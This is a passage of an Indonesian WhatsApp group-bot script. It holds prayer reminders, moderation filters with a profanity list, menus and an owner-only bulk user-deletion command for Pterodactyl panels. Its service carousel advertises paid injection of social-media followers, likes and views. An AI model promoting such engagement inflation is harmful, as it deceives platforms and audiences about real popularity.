    global.sambutanCooldown[m.chat] = currentTimee + 1000; 
  }
}

// auto shalat
// const cron = require('node-cron')
const biyumoment = require('moment-timezone')
const zona = 'Asia/Jakarta'
let userAktif = {}
const jadwalSholat = {
  subuh: '04:38',
  dzuhur: '11:56',
  ashar: '15:14',
  maghrib: '17:55',
  isya: '19:05'
}
function updateAktif(id) {
  userAktif[id] = Date.now()
}
function getTargetAktif() {
  const now = Date.now()
  const batas = 15 * 60 * 1000
  return Object.keys(userAktif).filter(id => now - userAktif[id] <= batas)
}
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}
cron.schedule('* * * * *', async () => {
  const now = biyumoment().tz(zona).format('HH:mm')
  for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (now === waktu) {
      const teks = `Waktunya adzan *${sholat.toUpperCase()}* untuk wilayah *Jakarta*.\nJangan lupa sholat ya!`
      const audioUrl = 'https://files.catbox.moe/6ssrmg.mp3'
      const imgMasjid = 'https://img1.pixhost.to/images/4978/587223973_biyuofficial.jpg' 
      const target = getTargetAktif()
      if (target.length === 0) {
        console.log('Tidak ada pengguna aktif untuk dikirim.')
        return
      }
      for (const [index, id] of target.entries()) {
        try {
          await delay(index * 2000)
          await conn.sendMessage(id, { image: { url: imgMasjid }, caption: teks })
          await conn.sendMessage(id, { audio: { url: audioUrl }, mimetype: 'audio/mp3' })
          console.log(`Pengingat adzan ${sholat} dikirim ke ${id}`)
        } catch (err) {
          console.error(`Gagal kirim ke ${id}:`, err.message)
        }
      }
    }
  }
})

// anti toxic
const dbDir = './database'
const filePath = path.join(dbDir, 'antitoxic.json')
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true })
}
if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, JSON.stringify({}, null, 2))
}
let antitoxic = JSON.parse(fs.readFileSync(filePath))
function saveAntiToxic() {
  fs.writeFileSync(filePath, JSON.stringify(antitoxic, null, 2))
}

if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active) {
  const toxicWords = [
    'anjing','babi','kontol','memek','bangsat','goblok','tolol','ngentot',
    'idiot','kampret','keparat','jembut','pepek','peler','pantek','lonte',
    'setan','dajjal','asu','sinting','bodoh','bacot','tai','fuck','bitch',
    'cukimak','sialan','dongo','kimak','pler','titit','anjir','pantat',
    'njir','kntl','memk','bangke','bgst','pukimak' // tambahin aj yg laib
  ]
  const body = m.text?.toLowerCase() || ''
  const found = toxicWords.find(word => body.includes(word))
  if (found) {
    const user = m.sender
    const warn = (antitoxic[m.chat].warnings[user] || 0) + 1
    antitoxic[m.chat].warnings[user] = warn
    saveAntiToxic()
    try {
      await conn.sendMessage(m.chat, { delete: m.key })
    } catch (e) {
      console.log('Gagal hapus pesan:', e)
    }
    if (warn >= 5) { //ubah ae itu kan klau udh 5x dikick 
      await conn.sendMessage(m.chat, {
        text: `❌ @${user.split('@')[0]} sudah toxic 5x dan akan dikeluarkan!`,
        mentions: [user]
      })
      try {
        await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
      } catch (e) {
        m.reply('Gagal kick. Bot bukan admin?')
      }
      delete antitoxic[m.chat].warnings[user]
      saveAntiToxic()
    } else {
      await conn.sendMessage(m.chat, {
        text: `⚠️ Kata toxic terdeteksi: *${found}*\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
        mentions: [user]
      })
    }
  }
}

// antilinkall
const antilinkFilee = path.join('./database', 'antilinkall.json')
if (!fs.existsSync(antilinkFilee)) fs.writeFileSync(antilinkFilee, JSON.stringify({}, null, 2))
let antilinkall = JSON.parse(fs.readFileSync(antilinkFilee))
function saveantilinkAll() {
  fs.writeFileSync(antilinkFilee, JSON.stringify(antilinkall, null, 2))
}
if (m.isGroup && !m.key.fromMe && antilinkall[m.chat]?.antilink) {
  const body = m.text || ''
  const isAnyLink = body.match(/https?:\/\/[^\s]+/gi) 
  if (isAnyLink) {
    const groupMetadata = await conn.groupMetadata(m.chat)
    const groupLinkCode = await conn.groupInviteCode(m.chat)
    const isOwnGroupLink = isAnyLink.some(link => link.includes(`https://chat.whatsapp.com/${groupLinkCode}`))
    const isAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin
    if (!isOwnGroupLink && !isAdmin) {
      const user = m.sender
      const warn = (antilinkall[m.chat].warnings?.[user] || 0) + 1
      if (!antilinkall[m.chat].warnings) antilinkall[m.chat].warnings = {}
      antilinkall[m.chat].warnings[user] = warn
      saveantilinkAll()

      try {
        await conn.sendMessage(m.chat, { delete: m.key })
      } catch (e) {
        console.log('Gagal hapus link:', e)
      }
      if (warn >= 5) { // ubah aj max kick
        await conn.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        })
        try {
          await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
        } catch (e) {
          m.reply('Gagal kick. Bot bukan admin?')
        }
        delete antilinkall[m.chat].warnings[user]
        saveantilinkAll()
      } else {
        await conn.sendMessage(m.chat, {
          text: `⚠️ Link terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        })
      }
    }
  }
}

// antilinkk
const antilinkFile = path.join('./database', 'antilink.json')
if (!fs.existsSync(antilinkFile)) fs.writeFileSync(antilinkFile, JSON.stringify({}, null, 2))
let antilinkk = JSON.parse(fs.readFileSync(antilinkFile))
function saveantilinkk() {
  fs.writeFileSync(antilinkFile, JSON.stringify(antilinkk, null, 2))
}
if (m.isGroup && !m.key.fromMe && antilinkk[m.chat]?.antilink) {
  const body = m.text || ''
  const isGroupLink = body.match(/https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]{22}/gi)
  if (isGroupLink) {
    const groupMetadata = await conn.groupMetadata(m.chat)
    const groupLinkCode = await conn.groupInviteCode(m.chat)
    const isOwnGroupLink = isGroupLink.some(link => link.includes(groupLinkCode))
    const isAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin
    if (!isOwnGroupLink && !isAdmin) {
      const user = m.sender
      const warn = (antilinkk[m.chat].warnings[user] || 0) + 1
      antilinkk[m.chat].warnings[user] = warn
      saveantilinkk()

      try {
        await conn.sendMessage(m.chat, { delete: m.key })
      } catch (e) {
        console.log('Gagal hapus link:', e)
      }
      if (warn >= 5) { // ubah aja max buat kick nya
        await conn.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        })
        try {
          await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
        } catch (e) {
          m.reply('Gagal kick. Bot bukan admin?')
        }
        delete antilinkk[m.chat].warnings[user]
        saveantilinkk()
      } else {
        await conn.sendMessage(m.chat, {
          text: `⚠️ Link grup luar terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        })
      }
    }
  }
}

// anti link channel
// const fs = require('fs')
// const path = require('path')
const antichannelFile = path.join('./database', 'antichannel.json')
if (!fs.existsSync(antichannelFile)) fs.writeFileSync(antichannelFile, JSON.stringify({}, null, 2))
let antichannel = JSON.parse(fs.readFileSync(antichannelFile))
function saveAntichannel() {
  fs.writeFileSync(antichannelFile, JSON.stringify(antichannel, null, 2))
}
if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
  const body = m.text || ''
  const isChannelLink = body.match(/https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+/gi)
  const messageType = Object.keys(m.message || {})[0]
  const ctxInfo = m.message?.[messageType]?.contextInfo || {}
  const isSharedFromChannel =
    m.isForwarded ||
    ctxInfo.forwardingScore > 0 ||
    !!ctxInfo.forwardedNewsletterMessageInfo
  if (isChannelLink || isSharedFromChannel) {
    const groupMetadata = await conn.groupMetadata(m.chat)
    const isAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin
    if (!isAdmin) {
      const user = m.sender
      const warn = (antichannel[m.chat].warnings?.[user] || 0) + 1
      antichannel[m.chat].warnings = antichannel[m.chat].warnings || {}
      antichannel[m.chat].warnings[user] = warn
      saveAntichannel()

      try {
        await conn.sendMessage(m.chat, { delete: m.key })
      } catch (e) {
        console.log('Gagal hapus pesan:', e)
      }
      if (warn >= 5) { // ubah aja max kick
        await conn.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        })
        try {
          await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
        } catch (e) {
          m.reply('Gagal kick. Bot bukan admin?')
        }
        delete antichannel[m.chat].warnings[user]
        saveAntichannel()
      } else {
        await conn.sendMessage(m.chat, {
          text: `⚠️ Postingan dari Channel WhatsApp terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        })
      }
    }
  }
}

// anti promosi
if (db?.data?.chats[m.chat]?.antipromosi?.status && m.isGroup && !m.isAdmin) {
  const text = m.text || ''
  const promoRegex = /(chat\.whatsapp\.com|t\.me\/|discord\.gg|wa\.me\/|bit\.ly|linktr\.ee|08[0-9]{8,})/i
  if (promoRegex.test(text)) {
    let user = m.sender
    let data = db.data.chats[m.chat].antipromosi
    if (!data.count[user]) data.count[user] = 1
    else data.count[user]++
    if (data.count[user] >= 3) { // ubah aja max kick
      await conn.sendMessage(m.chat, {
        text: `@${user.split('@')[0]} dikeluarkan karena promosi lebih dari 3x.`,
        mentions: [user]
      })
      await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
      delete data.count[user]
    } else {
      await conn.sendMessage(m.chat, {
        text: `@${user.split('@')[0]} jangan promosi di sini! (${data.count[user]}/3)`,
        mentions: [user]
      })
      await conn.sendMessage(m.chat, { delete: m.key })
    }
  }
}

// autohari
// const fs = require('fs')
// const path = require('path')
const momentt = require('moment-timezone')
momentt.tz.setDefault("Asia/Jakarta")
const autohariFile = path.join('./database', 'autohari.json')
if (!fs.existsSync(autohariFile)) {
  fs.mkdirSync(path.dirname(autohariFile), { recursive: true })
  fs.writeFileSync(autohariFile, JSON.stringify({}, null, 2))
}
let autohariDB = JSON.parse(fs.readFileSync(autohariFile))
function saveAutohari() {
  fs.writeFileSync(autohariFile, JSON.stringify(autohariDB, null, 2))
}
async function checkAutoHari(chatId) {
  const dayOfWeek = momentt().format('dddd').toLowerCase()
  if (!autohariDB[chatId]) {
    autohariDB[chatId] = {
      senin: { active: true },
      selasa: { active: true },
      rabu: { active: true },
      kamis: { active: true },
      jumat: { active: true },
      sabtu: { active: true },
      minggu: { active: true }
    }
    saveAutohari()
  }
  const groupData = autohariDB[chatId]
  if (groupData?.[dayOfWeek]?.active) {
    const groupMetadata = await conn.groupMetadata(chatId)
    const mentions = groupMetadata.participants.map(p => p.id)
    let message = `Selamat hari ${dayOfWeek.charAt(0).toUpperCase() + dayOfWeek.slice(1)}!`
    if (dayOfWeek === 'senin') message += "\nSemangat menjalani minggu baru, semoga hari ini penuh berkah dan produktif!"
    else if (dayOfWeek === 'selasa') message += "\nHari kedua, tetap semangat!"
    else if (dayOfWeek === 'rabu') message += "\nSudah di pertengahan minggu, semoga terus maju!"
    else if (dayOfWeek === 'kamis') message += "\nJangan lupa bersyukur, sudah hampir akhir minggu!"
    else if (dayOfWeek === 'jumat') message += "\nJumat berkah! Semoga hari ini penuh kebaikan."
    else if (dayOfWeek === 'sabtu') message += "\nAkhir minggu, saatnya untuk rileks dan recharge!"
    else if (dayOfWeek === 'minggu') message += "\nSelamat beristirahat dan semoga bisa recharge untuk minggu depan!"
    await conn.sendMessage(chatId, {
      text: message,
      mentions: mentions
    })
  }
}
let lastSentDate = ''
setInterval(async () => {
  const now = momentt()
  const jam = now.format('HH:mm')
  const today = now.format('YYYY-MM-DD')
  if (jam === '06:00' && lastSentDate !== today) {
    lastSentDate = today
    for (let groupId of Object.keys(autohariDB)) {
      await checkAutoHari(groupId)
    }
  }
}, 60 * 1000) 

// anti hide tag
db.data = db.data || {}
db.data.chats = db.data.chats || {}
db.data.users = db.data.users || {}
const contextInfo =
  m.message?.extendedTextMessage?.contextInfo ||
  m.message?.imageMessage?.contextInfo ||
  m.message?.videoMessage?.contextInfo ||
  m.message?.documentMessage?.contextInfo ||
  m.message?.buttonsMessage?.contextInfo ||
  m.message?.templateMessage?.contextInfo ||
  m.message?.conversation?.contextInfo ||
  {}
const mentioned = contextInfo.mentionedJid || []
if (m.isGroup && !m.fromMe && mentioned.length) {
  const chat = db.data.chats[m.chat] ||= {}
  const user = db.data.users[m.sender] ||= {}
  const isAdminUser = m.isAdmin || m.isCreator || false
  if (chat.antihidetag && !isAdminUser) {
    user.tagSpam ??= 0
    user.tagSpam += 1
    try {
      await conn.sendMessage(m.chat, { delete: m.key })
    } catch (e) {
      console.log("Gagal hapus pesan:", e)
    }
    if (user.tagSpam >= 3) { // max kick ubah ae
      await conn.sendMessage(m.chat, {
        text: `@${m.sender.split("@")[0]} telah 3x men-tag anggota. Dikeluarkan dari grup.`,
        mentions: [m.sender]
      })
      try {
        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
      } catch (e) {
        await conn.sendMessage(m.chat, {
          text: `Gagal mengeluarkan @${m.sender.split("@")[0]}. Mungkin bukan admin.`,
          mentions: [m.sender]
        })
      }
      user.tagSpam = 0 
    } else {
      await conn.sendMessage(m.chat, {
        text: `@${m.sender.split("@")[0]}, jangan tag sembarangan!\nPeringatan ke-${user.tagSpam}/3`,
        mentions: [m.sender]
      })
    }
  }
}
//~~~~~~~~~ Function Main ~~~~~~~~~~//
const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*All Transaksi Open ✅*\n\n*${global.namaOwner}* Menyediakan Produk & Jasa Dibawah Ini ⬇️"`
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*${global.namaOwner} Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.
`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const argsbiyuoffc = body.trim().split(/ +/).slice(1)
//~~~~~~~~~~~ Command ~~~~~~~~~~~//
switch (command) {
case "menu": {
if (!userData[m.sender] && command !== 'register') {
  return m.reply('⚠️ Kamu belum terdaftar!\nKetik *register nama|umur* untuk mendaftar.');
}
// await loading()
  let teksnya = `
┌──────────────────┐
│   ◄◄◄ *${global.botname2}* ►►►  
└──────────────────┘

⚡ *Bot Info*
◦ Nama Bot: *${global.botname2}*
◦ Version: ${versi}
◦ Creator: ${namaOwner}
◦ Total Fitur: ${totalfitur()}

👋 Haii @${m.sender.split("@")[0]},
Selamat datang di *${global.botname2}*! Saya adalah bot WhatsApp yang siap membantu Anda.

╭───「 *MENU NAVIGASI* 」
│ > Ketik Allmenu untuk menu button
│ > Ketik Allmenu2 untuk menu non-button
│ > Ketik donate untuk support owner.
╰────────────────

⚠️ *Note:* 
Bot ini masih dalam tahap pengembangan.
Jika menemukan error silahkan report!

© ${namaOwner} 
`
await conn.sendMessage(m.chat, { 
  text: teksnya, 
  mentions: [m.sender], 
  contextInfo: {
    isForwarded: true, 
    forwardedNewsletterMessageInfo: { 
      newsletterJid: global.idSaluran, 
      newsletterName: global.namaSaluran 
    }, 
    externalAdReply: { 
      title: `${botname} - ${versi}`, 
      body: `Runtime : ${runtime(process.uptime())}`, 
      thumbnailUrl: global.image.menu, 
      sourceUrl: linkSaluran, 
      mediaType: 1, 
      renderLargerThumbnail: true, 
    }, 
  } 
}, { quoted: m })

await conn.sendMessage(m.chat, { 
  audio: fs.readFileSync('./audio.mp3'), 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: m })
}
break

//==============================//
case 'all': case 'allmenu': {
await conn.sendMessage(m.chat, {
image: { url: global.image.menu },
caption: menutxt, 
footer: '',
buttons: [
{
buttonId: `${prefix}owner`, 
buttonText: { displayText: '☎️ Hubungi Owner' },
type: 1
},
{
buttonId: 'action',
buttonText: { displayText: '🛒 Pilih Produk' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Pilih Produk Digital',
sections: [
{
title: '🔥 Produk Rekomendasi',
rows: [
{ title: 'Panel Pterodactyl', description: 'Panel untuk mengelola server game.', id: prefix + 'buypanel' },
{ title: 'Admin Panel Pterodactyl', description: 'Panel admin untuk Pterodactyl.', id: prefix + 'buyadp' },
{ title: 'VPS (Virtual Private Server)', description: 'Sewa VPS dengan harga terbaik.', id: prefix + 'buyvps' },
{ title: 'Script Bot WhatsApp', description: 'Beli script bot WhatsApp siap pakai.', id: prefix + 'buysc' }
]
},
{
title: '💰 Layanan & Topup',
rows: [
{ title: 'DigitalOcean', description: 'Saldo DigitalOcean dengan harga hemat.', id: prefix + 'buydo' },
{ title: 'Jasa JPM Pesan', description: 'Layanan JPM dengan berbagai paket.', id: prefix + 'buyjasajpm' },
{ title: 'Topup Saldo Ewallet', description: 'Isi saldo e-wallet dengan mudah.', id: prefix + 'topupsaldo' },
{ title: 'Topup Diamonds', description: 'Beli diamonds game favoritmu.', id: prefix + 'topupdiamond' },
{ title: 'Topup Pulsa', description: 'Isi ulang pulsa dengan cepat.', id: prefix + 'isipulsa' }
]
}
]
})
}
}
],
headerType: 4,
viewOnce: true,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
externalAdReply: {
title: global.botname2,
thumbnailUrl: global.image.menu,
sourceUrl: linkGrup,
renderLargerThumbnail: true
},
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
newsletterName: global.namaSaluran
},
groupInviteMessage: {
groupJid: global.linkGrupWhatsApp,
inviteCode: "xyz123abc",
groupName: "Bot Biyu Offc",
caption: "Group chat invite"
}
}
}, { quoted: m });

await conn.sendMessage(m.chat, {
audio: fs.readFileSync('./audio.mp3'),
mimetype: 'audio/mpeg',
ptt: true
}, { quoted: m })
}
break

case "allmenu2": case "all2":  {
// await loading()
await conn.sendMessage(m.chat, { 
  text: menutxt, 
  contextInfo: { 
    mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
    externalAdReply: { 
      title: `${botname} - ${versi}`, 
      body: `Runtime : ${runtime(process.uptime())}`, 
      thumbnailUrl: global.image.menu, 
      sourceUrl: linkSaluran, 
      mediaType: 1, 
      renderLargerThumbnail: true 
    } 
  } 
})

await conn.sendMessage(m.chat, { 
  audio: fs.readFileSync('./audio.mp3'), 
  mimetype: 'audio/mpeg', 
  ptt: true 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'antivideo': {
  if (!m.isGroup) return m.reply('Fitur ini hanya bisa digunakan di grup!');
  if (!m.isBotAdmin) return m.reply(mess.botAdmin);
  if (argsbiyuoffc[0] === 'on') {
    antivideoDB.status[m.chat] = true;
    saveAntivideo();
    m.reply('Fitur anti video telah diaktifkan!');
  } else if (argsbiyuoffc[0] === 'off') {
    antivideoDB.status[m.chat] = false;
    saveAntivideo();
    m.reply('Fitur anti video telah dimatikan!');
  } else {
    m.reply(`Kirim perintah:\n• *${prefix}antivideo on* untuk mengaktifkan\n• *${prefix}antivideo off* untuk menonaktifkan`);
  }
}
break

case 'antisticker': {
  if (!m.isGroup) return m.reply('Fitur ini hanya bisa digunakan di grup!');
  if (!m.isBotAdmin) return m.reply(mess.botAdmin);
  if (argsbiyuoffc[0] === 'on') {
    antistickerDB.status[m.chat] = true;
    saveAntisticker();
    m.reply('Fitur anti stiker telah diaktifkan!');
  } else if (argsbiyuoffc[0] === 'off') {
    antistickerDB.status[m.chat] = false;
    saveAntisticker();
    m.reply('Fitur anti stiker telah dimatikan!');
  } else {
    m.reply(`Kirim perintah:\n• *${prefix}antisticker on* untuk mengaktifkan\n• *${prefix}antisticker off* untuk menonaktifkan`);
  }
}
break
case 'antifoto':
  if (!m.isGroup) return m.reply('Fitur ini hanya bisa digunakan di grup!');
  if (!m.isBotAdmin) return m.reply(mess.botAdmin);
  if (!argsbiyuoffc[0]) return m.reply('Contoh: antifoto on / antifoto off');
  const input = argsbiyuoffc[0].toLowerCase();
  if (input === 'on') {
    antifotoDB[m.chat] = true;
    saveAntifoto();
    m.reply('Fitur *Antifoto* telah *diaktifkan* untuk grup ini.');
  } else if (input === 'off') {
    delete antifotoDB[m.chat];
    if (antifotoDB.warn && antifotoDB.warn[m.chat]) {
      delete antifotoDB.warn[m.chat];
    }
    saveAntifoto();
    m.reply('Fitur *Antifoto* telah *dinonaktifkan* untuk grup ini.');
  } else {
    m.reply('Format salah! Gunakan:\n- antifoto on\n- antifoto off');
  }
  break
  
case 'antilinkch': {
  if (!m.isGroup) return m.reply('Fitur ini cuma bisa dipakai di grup!');
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!antichannel[m.chat]) antichannel[m.chat] = { active: false, warnings: {}, antichannel: false }

  const argsLower = q.toLowerCase();
  if (argsLower === 'on') {
    antichannel[m.chat].antichannel = true;
    saveAntichannel();
    m.reply('✅ Anti Link Channel WhatsApp AKTIF!');
  } else if (argsLower === 'off') {
    antichannel[m.chat].antichannel = false;
    saveAntichannel();
    m.reply('❌ Anti Link Channel WhatsApp NONAKTIF!');
  } else {
    m.reply(`Contoh:\n*${prefix}antichannel on*\n*${prefix}antichannel off*`);
  }
}
break

case 'antilinkk': {
  if (!m.isGroup) return m.reply('Fitur ini cuma bisa dipakai di grup!');
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!antilinkk[m.chat]) antilinkk[m.chat] = { active: false, warnings: {}, antilink: false }
  const argsLower = q.toLowerCase();
  if (argsLower === 'on') {
    antilinkk[m.chat].antilink = true;
    saveantilinkk();
    m.reply('✅ Anti Link Grup AKTIF!');
  } else if (argsLower === 'off') {
    antilinkk[m.chat].antilink = false;
    saveantilinkk();
    m.reply('❌ Anti Link Grup NONAKTIF!');
  } else {
    m.reply(`Contoh:\n*${prefix}antilink on*\n*${prefix}antilink off*`);
  }
}
break

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

case "githubstalk":
 if (!q) return m.reply("Masukkan username GitHub!\nContoh: .githubstalk FR3-host");
 let urll = `https://simple-api.luxz.xyz/api/tools/githubstalk?user=${q}`;
 try {
const axios = require('axios');
 const { data } = await axios.get(urll);
 if (!data.status) return m.reply("User tidak ditemukan!");
 let { username, nickname, bio, id, nodeId, profile_pic, url, type, admin, company, blog, location, email, public_repo, public_gists, followers, following, ceated_at, updated_at } = data.result;
 
 let caption = `*GitHub Stalk*\n\n`;
 caption += `👤 *Username:* ${username}\n`;
 caption += `📛 *Nickname:* ${nickname || "-"}\n`;
 caption += `📜 *Bio:* ${bio || "-"}\n`;
 caption += `🆔 *ID:* ${id}\n`;
 caption += `🔗 *Node ID:* ${nodeId}\n`;
 caption += `🌍 *URL:* ${url}\n`;
 caption += `📌 *Type:* ${type}\n`;
 caption += `🛠 *Admin:* ${admin ? "✅" : "❌"}\n`;
 caption += `🏢 *Company:* ${company || "-"}\n`;
 caption += `🔗 *Blog:* ${blog || "-"}\n`;
 caption += `📍 *Location:* ${location || "-"}\n`;
 caption += `📧 *Email:* ${email || "-"}\n`;
 caption += `📂 *Public Repo:* ${public_repo}\n`;
 caption += `📑 *Public Gists:* ${public_gists}\n`;
 caption += `👥 *Followers:* ${followers}\n`;
 caption += `👤 *Following:* ${following}\n`;
 caption += `📅 *Created At:* ${ceated_at}\n`;
 caption += `🔄 *Updated At:* ${updated_at}\n`;
 conn.sendMessage(m.chat, { image: { url: profile_pic }, caption }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat mengambil data.");
 }
 break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'clearuser': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    const args = body.trim().split(',');
    const command = argsbiyuoffc[0].toLowerCase();
    const excludeIds = argsbiyuoffc.slice(1).map(id => id.trim()).filter(Boolean);
    const panels = {
        'v1': { domain: global.domain, apikey: global.apikey },
        'v2': { domain: global.domainV2, apikey: global.apikeyV2 },
        'v3': { domain: global.domainV3, apikey: global.apikeyV3 },
        'v4': { domain: global.domainV4, apikey: global.apikeyV4 },
        'v5': { domain: global.domainV5, apikey: global.apikeyV5 },
    };
    if (!command.includes('v')) {
        return m.reply(`*[ Clear User Panel Pterodactyl ]*\n\n` +
            `*clearuser v1, id1, id2*\n> Hapus semua user di panel 1, kecuali ID yang disebut.\n\n` +
            `*clearuser v2*\n> Hapus semua user di panel 2, kecuali admin utama (ID: 1).\n\n` +
            `Contoh:\n.clearuser v1, 44, 45\n.clearuser v2`);
    }
    const version = command.replace('clearuser', '').trim();
    const config = panels[version];
    if (!config) return m.reply('Versi panel tidak ditemukan. Gunakan v1 - v5.');

    try {
        let res = await fetch(`${config.domain}/api/application/users`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${config.apikey}`,
            }
        });
        let data = await res.json();
        let users = data.data;
        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di panel ini.');
        }
        let hasil = [];
        for (let user of users) {
            let u = user.attributes;

            if (version === 'v2' && u.id === 1) {
                hasil.push(`> Mengabaikan admin utama (ID: 1 - ${u.username})`);
                continue;
            }
            if (excludeIds.includes(u.id.toString())) {
                hasil.push(`> Mengabaikan user: ${u.username} (ID: ${u.id})`);
                continue;
            }
            let del = await fetch(`${config.domain}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${config.apikey}`,
                }
            });
            if (del.ok) {
